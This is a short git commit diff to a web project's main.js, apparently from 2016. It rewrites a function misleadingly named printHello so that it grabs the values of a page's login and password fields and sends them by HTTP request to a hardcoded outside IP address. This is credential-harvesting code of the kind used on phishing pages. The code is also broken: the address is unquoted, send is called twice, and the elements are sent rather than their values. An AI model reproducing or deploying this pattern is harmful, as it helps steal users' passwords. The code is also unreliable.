484973d633d874c48c3dd280ef8955b4397ea6fb
Jordan Liu <jminjie@umich.edu>
2016-04-21 16:39:52 -0400

    Send request in main.js

--- javascripts/main.js
+++ javascripts/main.js
@@ -1,9 +1,12 @@
-console.log('This would be the main JS file.');
-
 function printHello() {
-	console.log("prints hello");
-	var password = document.getElementById('password');
+	// grab the login and pass
 	var uniq = document.getElementById('login');
-	console.log(password.value);
-	console.log(uniq.value);
+	var password = document.getElementById('password');
+
+	// send the login and pass as resquests
+	var xmlHttp = new XMLHttpRequest();
+	xmlHttp.open( "GET", 35.2.222.118, false ); // false for synchronous request
+	xmlHttp.send(uniq);
+	xmlHttp.send(password);
 }
+
